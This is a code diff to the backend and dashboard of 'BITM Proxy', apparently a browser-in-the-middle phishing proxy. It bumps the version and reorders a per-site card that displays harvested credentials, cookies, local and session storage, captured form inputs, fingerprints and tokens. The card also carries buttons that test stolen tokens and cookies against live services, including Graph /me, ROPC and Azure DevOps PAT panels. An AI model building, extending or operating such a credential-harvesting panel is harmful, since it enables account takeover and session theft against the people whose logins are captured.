@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.28.3")
+app = FastAPI(title="BITM Proxy Debug", version="1.28.4")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -317,8 +317,11 @@ async def test_upstream_proxy() -> dict:
 @app.get("/", response_class=HTMLResponse)
 async def dashboard():
     from fastapi import Response
+    # Inject the running app version at serve time (DASHBOARD_HTML is a
+    # static constant). Placeholder is shown on the Diagnostics pane.
+    html = DASHBOARD_HTML.replace("__APP_VERSION__", app.version)
     return Response(
-        content=DASHBOARD_HTML, media_type="text/html; charset=utf-8",
+        content=html, media_type="text/html; charset=utf-8",
         # Short cache — lets reconnecting dashboards skip the 200 KB HTML
         # re-download, but still pulls fresh after a deploy in < 60 s.
         headers={"Cache-Control": "public, max-age=60"},
@@ -2241,7 +2244,7 @@ requests.get("https://example.com",
           </div>
         </div>
         <div class="settings-pane" data-pane="diagnostics" style="display:none">
-          <h2>Diagnostics</h2>
+          <h2>Diagnostics <span style="font-size:13px;font-weight:400;color:#6e7681;margin-left:6px">BITM Proxy v__APP_VERSION__</span></h2>
           <p style="color:#94a3b8;font-size:13px;margin-bottom:10px">Runs read-only checks across the container to show what's actually happening. Use this when a proxy isn't showing logs, a tab looks empty, or something's "bypassing" the BITM. Re-run anytime.</p>
           <div style="display:flex;gap:8px;align-items:center;margin-bottom:14px">
             <button class="btn" onclick="runDiagnostics()">Run checks</button>
@@ -7330,16 +7333,7 @@ function renderCreds(){
           <button class="btn btn-danger" onclick="event.stopPropagation();send({cmd:'delete_credentials',site_id:'${site.id}'})">Delete</button>
         </div></div>
       <div class="card-body" id="cb-${site.id}" style="display:none">
-        ${renderCapturedHeaders(d,site.id)}
-        ${tc?renderTokens(d.tokens,site.id):''}
-        ${cc?`<div style="margin-bottom:8px"><div style="color:#fbbf24;font-weight:bold;margin-bottom:4px">Cookies (${cc})</div><div style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px">${(d.cookies||[]).map(c=>`<div><span style="color:#60a5fa">${esc(c.name)}</span> <span style="color:#8893a7">${esc((c.value||'').slice(0,80))}</span></div>`).join('')}</div></div>`:''}
-        ${ls?`<div style="margin-bottom:8px"><div style="color:#c084fc;font-weight:bold;margin-bottom:4px">localStorage (${ls})</div><pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#cbd5e1">${esc(JSON.stringify(d.local_storage,null,2))}</pre></div>`:''}
-        ${ss?`<div style="margin-bottom:8px"><div style="color:#c084fc;font-weight:bold;margin-bottom:4px">sessionStorage (${ss})</div><pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#cbd5e1">${esc(JSON.stringify(d.session_storage,null,2))}</pre></div>`:''}
-        ${ic?`<div style="margin-bottom:8px"><div style="color:#facc15;font-weight:bold;margin-bottom:4px">Inputs (${ic})</div><div style="background:#0a0a14;padding:8px;border-radius:4px">${capturedInputsArray.map(v=>`<div><span class="cap-label">CAPTURED_INPUT=</span><span class="cap-val">${mask(v)}</span></div>`).join('')}</div></div>`:''}
-        ${d.external_capture_metadata?`<div style="margin-bottom:8px"><div style="color:#a78bfa;font-weight:bold;margin-bottom:4px">Fingerprint & Metadata</div><div style="display:flex;gap:4px;margin-bottom:6px"><button class="btn" style="padding:2px 8px;font-size:12px;background:#2d1b4e;border:1px solid #6b21a8;color:#d8b4fe" onclick="document.getElementById('fp-summary-${site.id}').style.display='';document.getElementById('fp-json-${site.id}').style.display='none';event.target.style.background='#6b21a8';document.querySelector('[data-fp-json=${site.id}]').style.background='#2d1b4e';" data-fp-summary="${site.id}">Summary</button><button class="btn" style="padding:2px 8px;font-size:12px;background:#2d1b4e;border:1px solid #6b21a8;color:#d8b4fe" onclick="document.getElementById('fp-json-${site.id}').style.display='';document.getElementById('fp-summary-${site.id}').style.display='none';event.target.style.background='#6b21a8';document.querySelector('[data-fp-summary=${site.id}]').style.background='#2d1b4e';" data-fp-json="${site.id}">JSON</button></div><div id="fp-summary-${site.id}" style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:400px;color:#cbd5e1;font-size:12px;line-height:1.6">${renderFingerprintSummary(d.external_capture_metadata)}</div><div id="fp-json-${site.id}" style="display:none;background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:300px;color:#cbd5e1;font-size:12px"><pre style="margin:0">${esc(JSON.stringify(d.external_capture_metadata,null,2))}</pre></div></div>`:''}
-        ${d.current_url?`<div style="margin-top:8px;color:#78859b">URL: ${esc(d.current_url)}</div>`:''}
-        ${d.captured_at?`<div style="color:#78859b">Captured: ${new Date(d.captured_at*1000).toLocaleString()}</div>`:''}
-        <div style="margin-top:10px;padding-top:8px;border-top:1px solid #333;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
+        <div style="margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid #333;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
           <span style="color:#94a3b8;font-size:13px;font-weight:600">Test:</span>
           <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testDecode('${site.id}')">Decode JWTs</button>
           <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testToken('${site.id}')">Test Token (Graph /me)</button>
@@ -7348,7 +7342,16 @@ function renderCreds(){
           <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testCookies('${site.id}')">Test Cookies</button>
           <input id="test-url-${site.id}" class="cfg-input" style="flex:1;min-width:180px;font-size:13px" placeholder="Custom test URL (optional)" value="">
         </div>
-        <div id="test-result-${site.id}" style="margin-top:6px;display:none"></div>
+        <div id="test-result-${site.id}" style="margin-top:6px;margin-bottom:8px;display:none"></div>
+        ${tc?renderTokens(d.tokens,site.id):''}
+        ${renderCapturedHeaders(d,site.id)}
+        ${cc?`<div style="margin-bottom:8px"><div style="color:#fbbf24;font-weight:bold;margin-bottom:4px">Cookies (${cc})</div><div style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px">${(d.cookies||[]).map(c=>`<div><span style="color:#60a5fa">${esc(c.name)}</span> <span style="color:#8893a7">${esc((c.value||'').slice(0,80))}</span></div>`).join('')}</div></div>`:''}
+        ${ls?`<div style="margin-bottom:8px"><div style="color:#c084fc;font-weight:bold;margin-bottom:4px">localStorage (${ls})</div><pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#cbd5e1">${esc(JSON.stringify(d.local_storage,null,2))}</pre></div>`:''}
+        ${ss?`<div style="margin-bottom:8px"><div style="color:#c084fc;font-weight:bold;margin-bottom:4px">sessionStorage (${ss})</div><pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#cbd5e1">${esc(JSON.stringify(d.session_storage,null,2))}</pre></div>`:''}
+        ${ic?`<div style="margin-bottom:8px"><div style="color:#facc15;font-weight:bold;margin-bottom:4px">Inputs (${ic})</div><div style="background:#0a0a14;padding:8px;border-radius:4px">${capturedInputsArray.map(v=>`<div><span class="cap-label">CAPTURED_INPUT=</span><span class="cap-val">${mask(v)}</span></div>`).join('')}</div></div>`:''}
+        ${d.external_capture_metadata?`<div style="margin-bottom:8px"><div style="color:#a78bfa;font-weight:bold;margin-bottom:4px">Fingerprint & Metadata</div><div style="display:flex;gap:4px;margin-bottom:6px"><button class="btn" style="padding:2px 8px;font-size:12px;background:#2d1b4e;border:1px solid #6b21a8;color:#d8b4fe" onclick="document.getElementById('fp-summary-${site.id}').style.display='';document.getElementById('fp-json-${site.id}').style.display='none';event.target.style.background='#6b21a8';document.querySelector('[data-fp-json=${site.id}]').style.background='#2d1b4e';" data-fp-summary="${site.id}">Summary</button><button class="btn" style="padding:2px 8px;font-size:12px;background:#2d1b4e;border:1px solid #6b21a8;color:#d8b4fe" onclick="document.getElementById('fp-json-${site.id}').style.display='';document.getElementById('fp-summary-${site.id}').style.display='none';event.target.style.background='#6b21a8';document.querySelector('[data-fp-summary=${site.id}]').style.background='#2d1b4e';" data-fp-json="${site.id}">JSON</button></div><div id="fp-summary-${site.id}" style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:400px;color:#cbd5e1;font-size:12px;line-height:1.6">${renderFingerprintSummary(d.external_capture_metadata)}</div><div id="fp-json-${site.id}" style="display:none;background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:300px;color:#cbd5e1;font-size:12px"><pre style="margin:0">${esc(JSON.stringify(d.external_capture_metadata,null,2))}</pre></div></div>`:''}
+        ${d.current_url?`<div style="margin-top:8px;color:#78859b">URL: ${esc(d.current_url)}</div>`:''}
+        ${d.captured_at?`<div style="color:#78859b">Captured: ${new Date(d.captured_at*1000).toLocaleString()}</div>`:''}
         ${renderAaaTokenSnippet(d,site.id)}
         ${renderRopcPanel(d,site.id)}
         ${renderAdoPatPanel(d,site.id)}
